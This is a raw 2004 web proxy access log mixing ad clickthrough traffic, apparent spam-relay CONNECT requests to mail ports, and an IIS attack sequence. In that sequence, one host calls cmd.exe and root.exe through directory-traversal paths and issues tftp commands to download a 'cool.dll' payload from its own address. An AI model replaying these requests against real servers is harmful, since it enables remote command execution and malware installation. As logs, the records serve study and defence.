IP	Ident	Userid	Timestamp	Timezone	HTTP_Request	HTTP_Status	HTTP_Duration	HTTP_Referer	Browser_Type
212.160.136.163	-	-	[09/Mar/2004:23:11:24	-0500]	GET http://clickcheaper.com/go.php?u=snskansososkayaiad&l=zxhpznsisaaxsksfhmzchczihdzkhzcixacshshazfzmzzsxhyhohnzdzvsvayhshohozchhzaznzzzohyhdzhzkhyzhzhzyhzcicycnhvdmdmdhhyhdapavavazahznzkzmahaksnafsdszsxhkspsdsmakskapanapsxdkdochsnapsnahaozfaaayasazayzfzyzahvavsczzzzzsscskazzfznzyznzozssvafdfxvdasaavayamaisozizmzhzhzcapacazshaoaysaazayanapsxshafsmsxsnafzhahfmdnxkhxzyzpzpzzshzmhkzyhszaavapzvaospafafhmsnsdasszsasnanaksosmsaazxffhdpazhasnszsnsczmzvzchksvaaadaizmzxzpsaafapsf&k=aishsdaiayaysdscakaisz&b=zhhszxzohvzn&s=sfamszayahavsndi&x=&t=&tw=znhmzfzhzkzshkhdzozk&f=ea8a2b9a94f65ec5311a261e023b834e HTTP/1.0	302	0	http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=opportunity	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
212.160.136.163	-	-	[09/Mar/2004:23:11:25	-0500]	GET http://www.kanoodle.com/clickthrough.cool?position=7003&tid=bhngbnnobonpbhnobnnpzprvrsrsrv&bid=0.05&eid=1&id=76982878&query=opportunity&clickid=73221137&UNQ=00107889187953547659&searchip=192.168.1.103&subid=87 HTTP/1.0	301	326	http://www.clickcheaper.com/search.php?username=aklimczyk&keywords=opportunity	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.121.182.189	-	-	[09/Mar/2004:23:11:49	-0500]	CONNECT 210.242.13.180:25 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:13:14	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:15:32	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:15:32	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
24.42.165.180	-	-	[09/Mar/2004:23:16:05	-0500]	GET http://24.42.165.180/members/sex/fuck/id000036id/lund1296lundxxx.html HTTP/1.0	401	0	-	-
220.175.18.42	-	-	[09/Mar/2004:23:16:10	-0500]	GET http://www.bidppc.com/cgi-bin/sf.cgi?t=dj&keys=svschmavhisdhdhvhfamsshaacshzfzxskskzvayahapsphysnanzvszsashsvzksphpshszsmsfhcsxacsfsihazizyzzzkamaohmsxscaosahyasaisxaiscamapxnfpzkhhzihdhmaxazsoaksv&kw=mcse&keys2=zmhxhahfhazfznsyspavdddzdhsvcnzfzpfifhdsfszoaczhsyhiaczdsmaczyhmdsdssshshhaxhccsfpdnsyfnddasxfzszkhhfnsssazkzczyzyfdspscdddxcdzxaaafspddsosyxaaifnscfcfvhcfmhsxififnapfsspdzcoavsoddhxhadhshhsczsxhsfcaddfdacizzsmahdmdcspashkchdndsfnspsvfmcmzxavdsszfmdzzkxdzpdhfkaaadfvfozmhyacaafpfzasdkcyxddsfvdpazhcakxdxaanszsmsnfafkhkcmahfksyayfxzmhcxddsffavhzhssizzxvdafnfkfxfcsixfavsvhhddhzfvdsczhdspsyskspaashxkcmaasxahscdhakzhckamaffmfphsdhxhccdssihssffiaixdhofosvdvasaxdaciccaidcfcscfofvadhkazdfspsnaxavcmxnsxfysmdyaiadcdhydydmfiaaskzozfcndmaxdmfffdzoadxmsxspfxsffndpzpapzofhsodfhafkzixkfmazffsxdafvhxzssnfmamafahadxkhsaifhhcsisydoacxnsihihfaxhmsysnhdaiaazosmaahfhfzxhsaazizphkaizszksmhiapsssihvhozxspsxahsispasapxnfnzxhhhchzhaaxazsyaxsi&kw=mcse HTTP/1.0	302	1049	http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20	Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt)
220.175.18.42	-	-	[09/Mar/2004:23:16:12	-0500]	GET http://www.djump2it.com/cgi-bin/search/sf.cgi?t=ah&keys=zmhxhahfhazfznsyspavdddzdhsvcnzfzpfifhdsfszoaczhsyhiaczdsmaczyhmdsdssshshhaxhccsfpdnsyfnddasxfzszkhhfnsssazkzczyzyfdspscdddxcdzxaaafspddsosyxaaifnscfcfvhcfmhsxififnapfsspdzcoavsoddhxhadhshhsczsxhsfcaddfdacizzsmahdmdcspashkchdndsfnspsvfmcmzxavdsszfmdzzkxdzpdhfkaaadfvfozmhyacaafpfzasdkcyxddsfvdpazhcakxdxaanszsmsnfafkhkcmahfksyayfxzmhcxddsffavhzhssizzxvdafnfkfxfcsixfavsvhhddhzfvdsczhdspsyskspaashxkcmaasxahscdhakzhckamaffmfphsdhxhccdssihssffiaixdhofosvdvasaxdaciccaidcfcscfofvadhkazdfspsnaxavcmxnsxfysmdyaiadcdhydydmfiaaskzozfcndmaxdmfffdzoadxmsxspfxsffndpzpapzofhsodfhafkzixkfmazffsxdafvhxzssnfmamafahadxkhsaifhhcsisydoacxnsihihfaxhmsysnhdaiaazosmaahfhfzxhsaazizphkaizszksmhiapsssihvhozxspsxahsispasapxnfnzxhhhchzhaaxazsyaxsi&kw=mcse HTTP/1.0	302	598	http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20	Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt)
220.175.18.42	-	-	[09/Mar/2004:23:16:13	-0500]	GET http://c.ah-ha.com/c?e1=eD1Oxv5QolLydjkWivcIHoNhHJxD5JaQ33zRYtQxlE42TTKiRNr2wgBMNiQykMuAlDYsfzvFwj4IVpRJoBXAfhMuFgGpUt3zABEW4BUfrTonDpisbOLmhbzagmPBZ1C4j0HfOOZVBCpf41mPAMd4PmyBxOlDRzursKGn2dLUAMUNgNVcuiyEZieBXpG1CAtDtaYGzbXDSYlbaFKghzXAIiR1lZjmD44Ef0WXaRlVEHjG2YRtI5IcvIvfbaQUJpvO1sn1rrX40vHbJZyLGVdu15pDAeuvb&h=dy12QHSZ4xBiDDCkg&b=57265 HTTP/1.0	302	0	http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20	Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt)
220.175.18.42	-	-	[09/Mar/2004:23:16:14	-0500]	GET http://c.ah-ha.com/c/2?e1=eD1Oxv5QolLydjkWivcIHoNhHJxD5JaQ33zRYtQxlE42TTKiRNr2wgBMNiQykMuAlDYsfzvFwj4IVpRJoBXAfhMuFgGpUt3zABEW4BUfrTonDpisbOLmhbzagmPBZ1C4j0HfOOZVBCpf41mPAMd4PmyBxOlDRzursKGn2dLUAMUNgNVcuiyEZieBXpG1CAtDtaYGzbXDSYlbaFKghzXAIiR1lZjmD44Ef0WXaRlVEHjG2YRtI5IcvIvfbaQUJpvO1sn1rrX40vHbJZyLGVdu15pDAeuvb&h=dy12QHSZ4xBiDDCkg&b=57265 HTTP/1.0	302	0	http://www.bidppc.com/cgi-bin/smartsearch.cgi?username=arongyi&keywords=MCSE%20%20	Mozilla/4.0 (compatible; MSIE 6.0; MSNIA; Windows 98; DigExt)
203.121.182.141	-	-	[09/Mar/2004:23:17:36	-0500]	CONNECT 200.55.105.107:25 HTTP/1.0	500	434	-	-
203.121.182.142	-	-	[09/Mar/2004:23:17:37	-0500]	CONNECT 128.255.89.26:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:18:05	-0500]	GET /scripts/root.exe?/c+dir HTTP/1.0	200	566	-	-
61.172.244.232	-	-	[09/Mar/2004:23:18:05	-0500]	CONNECT 209.15.20.151:25 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:18:18	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
203.121.182.190	-	-	[09/Mar/2004:23:18:35	-0500]	\x04\x01	501	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:18:55	-0500]	GET /scripts/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:18:55	-0500]	GET /scripts/httpodbc.dll HTTP/1.0	404	288	-	-
68.48.142.117	-	-	[09/Mar/2004:23:19:46	-0500]	GET /MSADC/root.exe?/c+dir HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:23:20:37	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:20:38	-0500]	GET /MSADC/root.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:20:38	-0500]	GET /MSADC/httpodbc.dll HTTP/1.0	404	286	-	-
192.117.242.67	-	-	[09/Mar/2004:23:20:40	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
218.78.209.42	-	-	[09/Mar/2004:23:21:21	-0500]	CONNECT 155.239.124.186:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:21:29	-0500]	GET /c/winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
212.160.136.163	-	-	[09/Mar/2004:23:22:05	-0500]	GET http://www.qksrv.net/image-1179173-8229697 HTTP/1.0	302	76	http://strony.wp.pl/wp/kaneda69/	Mozilla/6.0 [en] (Win98; I)
68.48.142.117	-	-	[09/Mar/2004:23:22:19	-0500]	GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:23:10	-0500]	GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:23:23:20	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
24.201.201.176	-	-	[09/Mar/2004:23:23:53	-0500]	GET http://www.acsearch.com/index.php?q=RZBbbsMgEEW3UiGVT2cwxthEVndQqR9dgB8kJrHBBVynqbr3jkmlfvDQ4YiZO62S6jsoocjHqv0XOQbFSkWM/dQhztrGp5Nv12HnOeIlCVyRssqKKmNQ4qp3WCiiTyaJDJ/3E7VuJ4OCDEAKRJUia9DetrP+Mxl54H4y/XX1U8I11hpjXNThsG1bdm2tc8Oks97NhyTG0bv1PCJw08vigonG2UYCFDSaoelGe+6sdZ2zS2fs3F3sdL/4uw9+uPUUu2qwJUE1XhjFTUrIec4KmqbQ/Md/ziENgKayaAopa16DpO+vbw0AA1lVdV5yUdWSlyAEDev+f7EHwUnq22I8hjXqofKcw/HnFw== HTTP/1.1	302	0	http://www.acsearch.com/	Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)
24.201.201.176	-	-	[09/Mar/2004:23:23:54	-0500]	GET http://www.kanoodle.com/clickthrough.cool?position=7004&tid=bhngbnnobonpbinmbjnlzjrzrsrdxc&bid=0.05&eid=1&id=77023214&query=investment%20fraud&clickid=57793907&UNQ=00107889263589736055&subid=4 HTTP/1.1	301	311	http://www.acsearch.com/	Mozilla/4.0 (compatible; MSIE 4.0; Windows NT)
68.48.142.117	-	-	[09/Mar/2004:23:24:00	-0500]	GET /c/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:24:00	-0500]	GET /c/httpodbc.dll HTTP/1.0	404	282	-	-
203.61.199.15	-	-	[09/Mar/2004:23:24:15	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:23:24:15	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:23:24:15	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:23:24:15	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:23:24:16	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:23:24:17	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:23:24:17	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
203.61.199.15	-	-	[09/Mar/2004:23:24:19	-0500]	HEAD http://www.bestobeast.com/members/ HTTP/1.0	200	0	-	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
68.48.142.117	-	-	[09/Mar/2004:23:24:50	-0500]	GET /d/winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:23:25:37	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:25:39	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:25:40	-0500]	GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
24.201.201.176	-	-	[09/Mar/2004:23:25:52	-0500]	GET http://www.ropile.com/index.php?q=NVDbboQgFPwXkvKGy00FNqTpyyZ9aNJfAGVbo6tUsW7T9N970DYBMswcDnPGGWW+FyMMWroWnRdTGyR0KZmq8q006GMN81fGUOPXHXGDupgBA65ShVQFoxVsnUlpULgezaCQ6f+3mWoNLShlJVDKoHUJ8+hu4e+npzFNIzqkZuiafp2HvQuDPu8pRXM6fbpdKULshikVzXQ7HYRb4v2xt+AQeysoxdEeNXix8wQo4DgtVuBkucR911rPK12KuiVCtJpIxzlxXHviFVdBO39tmhKHaDmGaGwQtQ8tFUTLqiJSeUo0rUvC4QwMREEbPNjd5gO/wNq2rXgeE4wY0oub+5CKaX7LmriE12wtD1dBWvfYzRBCZxitldJCSHH++QU= HTTP/1.1	302	0	http://www.ropile.com/	Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)
24.201.201.176	-	-	[09/Mar/2004:23:25:52	-0500]	GET http://vaclick.epilot.com/click.aspx?k=buy&b=300&p=epilot&s=ropile&pos=3&t=24&kid=b269537d-33d9-4a22-a29b-b828e9abfcc5&ep=2&sid=e37bed03-9466-48b0-9075-2907e137b30c&l=http:%2F%2Fwww.InternetMarket.org%2F%3FePilot HTTP/1.1	302	281	http://www.ropile.com/	Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)
68.48.142.117	-	-	[09/Mar/2004:23:26:31	-0500]	GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
212.160.132.1	-	-	[09/Mar/2004:23:27:13	-0500]	GET http://140.99.44.61/cgi-bin/jenv.cgi HTTP/1.0	200	965	-	fork()
212.160.132.1	-	-	[09/Mar/2004:23:27:14	-0500]	CONNECT www.microsoft.com:80 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:27:21	-0500]	GET /d/winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:27:21	-0500]	GET /d/httpodbc.dll HTTP/1.0	404	282	-	-
80.54.146.135	-	-	[09/Mar/2004:23:27:34	-0500]	GET http://www.cybermoo.com/affiliates/click.php?argx=c139ae8a2a33b6c0f1a8dc6f56aaa44ee47cd8eb25f1be578cb2c77b611845b1062fbcb0d42feefc62fb7af11e90390964b25748b6aee2e87640fff7f04b4ca36762c680d8326ab05d440b600605ecde857e6d4e678899c933c4429106c87db41d250ef70aca9a1c09174321c03d9779deb87757b8899b963bbba5139eb151841f500bd0de0e038212f29fef61cf07b5436c7fe65d93037dee3a72c81b6349533c5b5370a35ffa1f7e2b13e884bb81615a233e6b57d2134856402d6c930e2a1ecaad66a7c9ec998929d3b0c1a9ba2534f8ff4e24ff7637b2ad28b8bf1ab72dab34eaaf45da5eadc6c222e4bfa55b84356ab76b9cb3373cc71fb8e7f0002fac707ec4709fc24c4be33297c969cd9582c9c721cfc34af5450700a83886c92c47c5f66c99700847ac91e128ea9fc1f65663272e02c612e31ce5127a09b90c1cfb755f1f3993ca08c8c6aa8277550abb7f5537b3f7da0feeb284d5013fdc00a3df0e0b7a25ac91921988e336bc51a06f27d531048d839a4b36d62c5eff11952c4cda4c630caaeea6d99dff52d22e696ab202c1d05f5aced375b61f0ce5f8810c54167d223091af12f171648492c2da580ae4d981a89aaab06fe7559ed78831953900cb8d85e6e29775dba9652960869d709bf6805a1d8c7af714d45656a3e4dc1983 HTTP/1.0	302	332	http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer	Mozilla/4.5 [en-us] (WinNT; I)
80.54.146.135	-	-	[09/Mar/2004:23:27:35	-0500]	GET http://www.epilot.com/click.aspx?k=digital%20camera%20printer&b=320&p=kanoodle&s=cybermoo&pos=2&sid=9bef258d-4ab1-48ca-83c9-810362d6f41e&l=http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=76242067&lid=bhnnbinmbknibonkbmnibkngbonmbmnn&query=digital%20camera%20printer HTTP/1.0	302	402	http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer	Mozilla/4.5 [en-us] (WinNT; I)
80.54.146.135	-	-	[09/Mar/2004:23:27:36	-0500]	GET http://www.kanoodle.com/clickthrough.cool?eid=1&clickid=12486486&id=76242067&lid=bhnnbinmbknibonkbmnibkngbonmbmnn&query=digital%20camera%20printer HTTP/1.0	301	352	http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer	Mozilla/4.5 [en-us] (WinNT; I)
80.54.146.135	-	-	[09/Mar/2004:23:27:36	-0500]	GET http://www1.ritzcamera.com/?location=KNR318&cat=5739564&tmlpse=true HTTP/1.0	200	1588	http://www.cybermoo.com/affiliates/result.php?affid=257&searchterm=digital+camera+printer	Mozilla/4.5 [en-us] (WinNT; I)
203.121.182.139	-	-	[09/Mar/2004:23:28:10	-0500]	CONNECT 200.248.220.242:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:28:11	-0500]	GET /scripts/..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:23:28:21	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
203.121.182.190	-	-	[09/Mar/2004:23:28:27	-0500]	\x04\x01	501	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:29:04	-0500]	GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
61.172.244.112	-	-	[09/Mar/2004:23:29:44	-0500]	CONNECT 209.15.20.86:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:29:54	-0500]	GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
218.78.209.42	-	-	[09/Mar/2004:23:30:44	-0500]	CONNECT 168.226.152.46:25 HTTP/1.0	500	434	-	-
68.48.142.117	-	-	[09/Mar/2004:23:30:45	-0500]	GET /scripts/..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:23:30:48	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:30:54	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:31:35	-0500]	GET /scripts/..%255c../httpodbc.dll HTTP/1.0	200	566	-	-
203.121.182.142	-	-	[09/Mar/2004:23:32:01	-0500]	CONNECT 221.147.5.145:25 HTTP/1.0	200	-	-	-
220.173.17.142	-	-	[09/Mar/2004:23:32:13	-0500]	POST http://www.canada44.ca/ HTTP/1.1	200	27095	http://www.so123.com	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
220.173.17.142	-	-	[09/Mar/2004:23:32:15	-0500]	GET http://www.canada44.ca/index.php?q=LZLbjqJAEIZfZcMtiYKcmp5MNjqCwyggnuXGNNBCIzTQIKCbfffFmb3oVNVff32ppBpBAP/UUIJcTSLurYYq5GRZA7r8KhTIVXfMHq9cBJCzaIMZxc0vG7EbbgiNX50J5Ej5bRkwKhjJYCQK6vD0lyhDDl9/2CLkpFccbMFLiaAwEgRJUwZtoN/rAY5y/G0dxi5zw5zuV7vLfmtsLtyPKcxIeLuz7BstDNsmTVPC8bjruhEKa4xYmIzCIh+XiDUUs3GfZxeKu1GZlL+r9/VhFgS1HRurfpkcPJ6Gp7OSmH67X2TX1pu6y3Nfe/a9pytU0Wsrp4F+XMxo0kwi58AKJpxOOXu0DlU9WV36or1T/KUrqdis5JzsAH+1MyO17/KGCTUht/g4n92crHZWRssyXlE+XQdUarr20Ec821jyzhS7A8vVOmt5+oUdN6hYRW/Pu4OU58St2MY3klIsrvMml0z02Vnj43a112Ic5QY6Z+l62n0luGRzubRWbbKfEhKcGl2Kn4okFV7Da0ThH+uFIh2foUy7p2lFLAyW6Ei7jhRhsX2ofuASPm0Rn4BwO06jmQ5Qwc4H72QtYgZAu/KmcwudSOo6krycVls/FKP+w/afTtFHSm7qC0mQdLLfBZ9aD97/fyXcl4QNByVQFDQAdEmbaG9//wE= HTTP/1.1	302	695	http://www.canada44.ca/	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
220.173.17.142	-	-	[09/Mar/2004:23:32:15	-0500]	GET http://www.acsearch.com/partner/xml_new.php?q=PVBbbsMgELxKhVQ+ncXY5hFZvUGlfvQAOKYxsQMuxnLaqnfv4jb9WGBnht2dNVror0XXmryvNn6Q46KZ1MT5ZKO36eFq4miT8+fMlEjMu4Rr0siikgWDBkNlsNLEvrl+55HON8q6jPQaCgBRI4TF1wVrm6slv+nJeNObqrqnkzuNa5z2OqrRZEhp1ofDtm3FaHwI/WSLU7gedmEaYljPAwJheprD4pILvhUAiibXt93gz533oQt+7i5+yPG53Wzc4nwzFIdrcbKaWnwwiocoSy6ZbOi+jva+h8cS/jdB98aorYVQXIGgr88vLQADIaXijON34KAqSZc1dxCMZzNoxd5mF9G3039iUTbH7x8= HTTP/1.1	302	0	http://www.canada44.ca/	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
220.173.17.142	-	-	[09/Mar/2004:23:32:16	-0500]	GET http://www.kanoodle.com/clickthrough.cool?position=7009&tid=bhngbnnobonpbjnhbjnhzwxerwrpxa&bid=0.05&eid=1&id=72238186&query=internet%20marketing&clickid=57793907&UNQ=00107889313186030948&subid=713 HTTP/1.1	301	343	http://www.canada44.ca/	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
220.173.17.142	-	-	[09/Mar/2004:23:32:17	-0500]	GET http://www.commerce-database.com/internetmarketing.htm HTTP/1.1	200	9065	http://www.canada44.ca/	Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)
68.48.142.117	-	-	[09/Mar/2004:23:32:28	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
203.121.182.141	-	-	[09/Mar/2004:23:32:57	-0500]	CONNECT 195.214.161.18:25 HTTP/1.0	200	-	-	-
203.121.182.189	-	-	[09/Mar/2004:23:33:16	-0500]	CONNECT 210.242.13.88:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:33:18	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
203.121.182.144	-	-	[09/Mar/2004:23:33:28	-0500]	CONNECT 210.210.11.103:25 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:33:34	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
61.172.244.216	-	-	[09/Mar/2004:23:34:04	-0500]	CONNECT 212.118.1.226:25 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:34:08	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:34:59	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:35:52	-0500]	GET /_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0	200	566	-	-
192.117.242.67	-	-	[09/Mar/2004:23:36:05	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
192.117.242.67	-	-	[09/Mar/2004:23:36:13	-0500]	CONNECT login.icq.com:443 HTTP/1.0	200	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:36:42	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0	200	566	-	-
68.48.142.117	-	-	[09/Mar/2004:23:37:32	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0	200	566	-	-
203.121.182.139	-	-	[09/Mar/2004:23:37:39	-0500]	CONNECT 209.15.20.140:25 HTTP/1.0	200	-	-	-
203.121.182.190	-	-	[09/Mar/2004:23:38:21	-0500]	\x04\x01	501	-	-	-
68.48.142.117	-	-	[09/Mar/2004:23:38:23	-0500]	GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0	200	566	-	-
24.201.201.176	-	-	[09/Mar/2004:23:38:24	-0500]	GET http://3000search.com/search.php?ID=15862&fString=miami+beach+hotel HTTP/1.1	302	5	http://3000search.com/?ID=16602	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
24.201.201.176	-	-	[09/Mar/2004:23:38:25	-0500]	GET http://3000search.com/search_results.php?fSearch_id=cb2a55a06b4b46d6&fString=miami+beach+hotel HTTP/1.1	200	16321	http://3000search.com/?ID=16602	Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
